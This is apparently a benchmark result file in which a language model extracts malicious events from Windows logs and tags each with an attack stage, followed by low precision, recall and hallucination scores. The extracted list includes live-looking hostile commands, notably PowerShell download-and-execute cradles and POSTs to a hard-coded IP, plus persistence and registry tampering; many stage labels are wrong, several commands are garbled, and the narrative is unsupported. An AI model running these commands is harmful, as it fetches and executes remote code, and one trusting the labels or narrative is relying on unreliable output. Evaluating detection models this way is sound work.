@@ -1,0 +1,166 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1960 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=8 --launch-time-ticks=268904258981 --mojo-platform-channel-handle=3380 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe\\HxOutlook.exe -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:C\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\DEVOBJ.dll",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u1E72.ucliju65ir.rs1.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\4iwlyhn4\\\\4iwlyhn4.cmdline\\\",",
+        "stage": "Collection"
+      },
+      {
+        "command": "cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\RES34B4.tmp\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\" ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1134.001 -TestNumbers 1\\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "get-secmenuletter",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "\\[System.Net.HttpWebRequest]::Create 'http://124.223.85.207:8082'); $request.Method = 'POST'; $postFields = '\\'{\\\"message\\\":\\\"{\\\"function\\\":\\\"kernel32.dll.GetProcAddress\\\",\\\"args\\\":\\ \"{\\\"arg0\\\":\\\"kernel32.dll\\\",\\\"arg1\\\":\\\"GetProcAddress\\\"}\\}\"\\\"}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'; Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '.\\chromeRemoteServices.ps1'",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-URLCacheClear T1059.001 -CleanUrls ClearAll\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem'), \"Add-Type -AssemblyName System.IO.Compression.FileSystem\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI]::CreateThread([IntPtr]::Zero,[UIntPtr]::new(0),[Void]* '   ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI].enum_logon_type(3)",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers initiated their campaign with initial access, exploiting the Windows Defender Exploit Guard vulnerability to execute arbitrary code. This allowed them to gain persistent access to the system, elevate their privileges, steal credentials, discover the target's environment, and evade detection. Using the stolen credentials, they conducted lateral movements, communicating with their C2 server to maintain connection and gather more information about the target system.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 126054,
+      "completion_tokens": 10560,
+      "total_tokens": 136614,
+      "wall_clock_s": 146.92,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.20689655172413793,
+      "recall": 0.17142857142857143,
+      "f1": 0.1875,
+      "tp": 6,
+      "fp": 23,
+      "fn": 29
+    },
+    "stage": {
+      "precision": 0.06896551724137931,
+      "recall": 0.05405405405405406,
+      "f1": 0.06060606060606061,
+      "tp": 2,
+      "fp": 27,
+      "fn": 35,
+      "recall_partial": 0.13513513513513514
+    },
+    "hallucination_rate": 0.25,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 126054,
+      "completion_tokens": 10560,
+      "total_tokens": 136614,
+      "wall_clock_s": 146.92,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
